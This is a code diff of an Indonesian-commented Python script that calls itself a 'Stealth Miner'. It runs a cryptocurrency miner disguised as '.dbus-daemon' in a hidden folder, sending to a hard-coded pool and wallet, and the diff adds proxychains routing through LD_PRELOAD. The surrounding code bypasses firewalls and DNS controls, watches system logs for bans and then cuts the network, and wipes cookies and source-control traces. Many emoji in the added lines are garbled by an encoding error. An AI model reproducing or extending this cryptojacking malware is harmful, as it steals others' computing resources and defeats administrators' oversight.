@@ -8,7 +8,7 @@ BIN_NAME = "cpuminer-sse2"
 ALIAS_BIN = ".dbus-daemon"
 HIDDEN_DIR = os.path.expanduser("~/.cache/.sysd")
 POOL = "stratum+tcp://164.92.145.122:80"
-WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Recut"
+WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Icut"
 PASSWORD = "x"
 THREADS = os.cpu_count()
 
@@ -22,7 +22,11 @@ cooldown_restart_counter = 0
 cooldown_restart_limit = 3
 cooldown_reset_time = time.time() + 3600
 
-# === Fungsi Tambahan ===
+def proxy_exec(cmd_args):
+    env = os.environ.copy()
+    env["LD_PRELOAD"] = os.path.abspath("./libproxychains.so")
+    env["PROXYCHAINS_CONF_FILE"] = os.path.abspath("./proxychains.conf")
+    return subprocess.Popen(cmd_args, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def fake_http_headers():
     headers = [
@@ -69,7 +73,7 @@ def should_restart():
     return False
 
 def disconnect_network():
-    print("[🔌] Putus koneksi...")
+    print("[馃攲] Putus koneksi...")
     try:
         subprocess.call(["nmcli", "networking", "off"])
         subprocess.call(["nmcli", "radio", "wifi", "off"])
@@ -78,7 +82,7 @@ def disconnect_network():
         except: pass
 
 def reconnect_network():
-    print("[🌐] Reconnect jaringan...")
+    print("[馃寪] Reconnect jaringan...")
     try:
         subprocess.call(["nmcli", "networking", "on"])
         subprocess.call(["nmcli", "radio", "wifi", "on"])
@@ -87,7 +91,7 @@ def reconnect_network():
         except: pass
 
 def detect_system_threat():
-    print("[🛡️] Cek sistem diblokir...")
+    print("[馃洝锔廬 Cek sistem diblokir...")
     paths = [
         "/var/log/auth.log", "/var/log/syslog", "/var/log/messages",
         "/etc/nologin", "/tmp/.X11-unix"
@@ -98,13 +102,13 @@ def detect_system_threat():
                 with open(path, "r", errors="ignore") as f:
                     log = f.read().lower()
                     if any(k in log for k in ["suspend", "ban", "terminate", "dismiss"]):
-                        print(f"[🚫] Deteksi diblokir: {path}")
+                        print(f"[馃毇] Deteksi diblokir: {path}")
                         disconnect_network()
                         restart_script()
             except: continue
 
 def firewall_bypass():
-    print("[🔥] Jalankan firewall bypass...")
+    print("[馃敟] Jalankan firewall bypass...")
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(2)
@@ -167,11 +171,11 @@ def run_one_session():
     os.chmod(hidden_path, 0o755)
 
     duration = random.randint(MIN_DURATION, MAX_DURATION)
-    print(f"[⚙️] Mining selama {duration}s...")
-    proc = subprocess.Popen([
+    print(f"[鈿欙笍] Mining melalui proxy selama {duration}s...")
+    proc = proxy_exec([
         hidden_path, "-a", "power2b", "-o", POOL,
         "-u", WALLET, "-p", PASSWORD, f"-t{THREADS}"
-    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    ])
     time.sleep(10)
     if os.path.exists(TARFILE): os.remove(TARFILE)
 
@@ -179,7 +183,7 @@ def run_one_session():
     while time.time() - start_time < duration:
         time.sleep(10)
         if is_cpu_100_percent():
-            print(f"[⛔] CPU penuh! cooldown {COOLDOWN_DURATION}s")
+            print(f"[鉀擼 CPU penuh! cooldown {COOLDOWN_DURATION}s")
             disconnect_network()
             proc.terminate()
             time.sleep(COOLDOWN_DURATION)
@@ -189,7 +193,7 @@ def run_one_session():
 
 def restart_script():
     try:
-        print("[🔁] Restarting...")
+        print("[馃攣] Restarting...")
         clean_miner_cache()
         clean_myapp_data()
         clean_mining_artifacts()
@@ -204,24 +208,20 @@ def main_loop():
         clean_mining_artifacts()
         run_one_session()
         pause = random.randint(MIN_PAUSE, MAX_PAUSE)
-        print(f"[⏸️] Istirahat {pause}s...\n")
+        print(f"[鈴革笍] Istirahat {pause}s...\n")
         time.sleep(pause)
 
-# Entry Point
 if __name__ == "__main__":
-    print("🚀 Stealth Miner Dimulai...")
+    print("馃殌 Stealth Miner Dimulai dengan Proxychains...")
     reconnect_network()
     clean_browser_cookies()
     clean_myapp_data()
     clean_source_control()
     fake_http_headers()
-
-    # Thread background proteksi
     threading.Thread(target=anti_suspend, daemon=True).start()
     threading.Thread(target=dns_doh_bypass, daemon=True).start()
     threading.Thread(target=firewall_bypass, daemon=True).start()
     threading.Thread(target=detect_system_threat, daemon=True).start()
-
     try: main_loop()
     except KeyboardInterrupt:
         restart_script()
